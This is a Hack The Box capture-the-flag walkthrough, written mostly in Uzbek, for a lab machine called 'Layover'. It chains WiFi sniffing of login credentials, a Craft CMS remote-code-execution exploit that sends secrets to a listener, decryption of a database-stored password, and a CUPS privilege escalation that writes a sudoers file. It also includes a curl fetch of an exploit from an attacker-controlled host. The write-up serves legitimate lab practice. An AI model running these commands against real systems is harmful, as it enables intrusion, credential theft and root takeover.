# HTB Layover — STEP BY STEP (amaliy yo'riqnoma)

**Topology (muhim!):**
- **Jumpbox** = HTB machine IP (`10.129.x.y`) = `airside-ws01` — siz RDP bilan kirasiz
- **Portal/target** = ichki tarmoqda (`10.13.37.x`) — flaglar **shu yerda**
- Jumpbox'dagi `wlan2` = `10.13.37.182` (callback manzili)

**Boshlang'ich credential:** `contractor / Contractor2026!`

---

## FAZA 0 — RDP va WiFi

```bash
xfreerdp /v:<HTB_IP> /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution +clipboard
```
Jumpbox ichida:
```bash
whoami; id            # contractor, groups: sudo, netdev, wireshark
sudo -l               # (ALL : ALL) ALL
iwconfig              # wlan2, wlan3
```

WiFi'ga ulanish + sniff:
```bash
sudo ip link set wlan2 up
sudo nmcli device wifi connect "HTB International WiFi" ifname wlan2
ip -brief addr show wlan2          # -> 10.13.37.182  [YOZIB OLING]

sudo nmcli device set wlan3 managed no
sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up
sudo iw dev wlan3 set channel 6
iwconfig wlan3                      # Mode:Monitor

sudo timeout 300 tshark -i wlan3 -w /tmp/wifi.pcap
sudo tshark -r /tmp/wifi.pcap -Y 'http.request.method=="POST"' \
  -T fields -e ip.src -e http.host -e http.request.uri \
  -e urlencoded-form.key -e urlencoded-form.value
```
**Natija:** `jenny : Fl1ghtDeck2026!` (`portal.international.htb/miles/login.php`)

---

## FAZA 1 — Craft CMS RCE (CVE-2026-44011)

Endpoint: `POST /admin/actions/element-search/search` · Advisory: **GHSA-qrgm-p9w5-rrfw**

**Ikki nozik nuqta (advisory'da shunday):**
1. Kalit nomi — **`typecastBeforeSave`** (`typecastAfterValidate` EMAS)
2. Buyruq — **bitta string**, `/bin/bash -c "..."` ko'rinishida (array EMAS)

Skript: `09_craft_rce_v6.py` (jumpbox'da ishga tushiriladi).

```bash
python3 /tmp/x.py      # v6 kodi, /tmp/x.py ga paste qilingan
```
Kutilayotgan:
```
HTTP 500                <- advisory ham aytadi: 500 NORMAL
listening...
REQ: <portal_ip> /Q1JBRlRfU0VDVVJJVFlfS0VZ...
OUT: CRAFT_SECURITY_KEY=...
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=...
```

**Nega base64 url-safe?** base64 ichida `/` bo'ladi, u URL'da yo'l ajratuvchi —
shuning uchun `tr '/+' '_-'` bilan almashtiramiz va listener qaytaradi.

---

## FAZA 2 — DB'dan `aporter` parolini olish

www-data sifatida (RCE orqali) MySQL'ga ulanamiz:
```bash
mysql -u craftuser -p'<CRAFT_DB_PASSWORD>' -D craft \
  -e "SELECT * FROM htbairways_settings\G"
```
`mailRelayPassword` — AES (base64) blob. `CRAFT_SECURITY_KEY` bilan ochamiz:
```bash
php -r 'require "/var/www/portal/vendor/autoload.php";
        $s=new yii\base\Security();
        echo $s->decryptByKey(base64_decode($argv[1]),$argv[2]),"\n";' \
    '<base64_blob>' '<CRAFT_SECURITY_KEY>'
```
(yoki `04_decrypt_aporter.php`)

**Natija:** `aporter : <parol>`

---

## FAZA 3 — USER FLAG 🏁

```bash
ssh aporter@10.13.37.<portal>       # yoki www-data shell orqali su -
cat ~/user.txt
```

---

## FAZA 4 — CUPS LPE (CVE-2026-34990) → ROOT FLAG 🏁

CUPS **2.4.16** (tuzatilgan: 2.4.17) · Advisory: **GHSA-c54j-2vqw-wpwp**

Mexanizm:
1. Vaqtinchalik printer yaratamiz → CUPS tashqariga IPP so'rov yuboradi
2. Biz `WWW-Authenticate: Local trc="y"` bilan javob beramiz → CUPS o'zining
   **`Authorization: Local <TOKEN>`** tokenini oshkor qiladi
3. Tokendan foydalanib `file:///etc/sudoers.d/<user>-pwn` printeri yaratamiz
4. Print job yuboramiz → root `cupsd` faylni **to'g'ridan-to'g'ri yozadi**

PoC: `https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC` → `exploit.py`
(`ipptool`, `lp` talab qiladi; foydalanuvchi nomini avtomatik oladi)

```bash
python3 exploit.py
#   [+] Local token: <TOKEN>
#   [+] ROOT via sudoers
sudo -n id
sudo -n bash
cat /root/root.txt     # <-- ROOT FLAG
```

**Portal'ga skriptni yetkazish:** www-data shell bor, shuning uchun
jumpbox'da `python3 -m http.server 9998` ishga tushirib:
```bash
curl -s http://10.13.37.182:9998/exploit.py -o /tmp/exploit.py
python3 /tmp/exploit.py
```

---

## Muammolar va yechimlar (bizning tajribamiz)

| Muammo | Sabab | Yechim |
|---|---|---|
| `mount.nfs` access denied | WSL NAT imtiyozli port | `networkingMode=mirrored` yoki Windows NFS client |
| SSH parol-auth ishlamadi | `sshd_config.d/60-cloudimg-settings.conf` da `PasswordAuthentication no` | `sudo sed -i 's/no/yes/'` + `systemctl restart ssh` |
| RDP'ga paste | bracketed-paste belgisi `^[[200~` | `bind 'set enable-bracketed-paste off'` yoki katta matnni `nano` orqali |
| Craft 400 | `Accept: application/json` yo'q / token yangilanmagan | v2+ (Accept + login'dan keyin token) |
| Craft 400→500 | payload strukturasi noto'g'ri | **`typecastBeforeSave`** + string buyruq (v6) |
| Callback buzilgan (`��-`) | base64'dagi `/` URL yo'lini kesadi | `tr '/+' '_-'` (url-safe) |
| Callback umuman kelmaydi | portal 9998 ga yeta olmadi | boshqa port sinash / webroot'ga fayl yozib HTTP orqali olish |

## Fayllar

```
01_rdp.sh                   RDP + port check
02_wifi_sniff.sh            WiFi pivot + tshark
04_decrypt_aporter.php      Yii2 decryptByKey
05_cups_lpe.sh              CUPS PoC runner
06_craft_rce_stdlib.py      to'liq Craft exploit (stdlib)
07_craft_rce_min.py         20 qatorlik
08_craft_rce_v2.py          + Accept header, token refresh, urlsafe b64, 500 body
09_craft_rce_v6.py          ADVISORY-CORRECT payload (ishlaydigan)
```
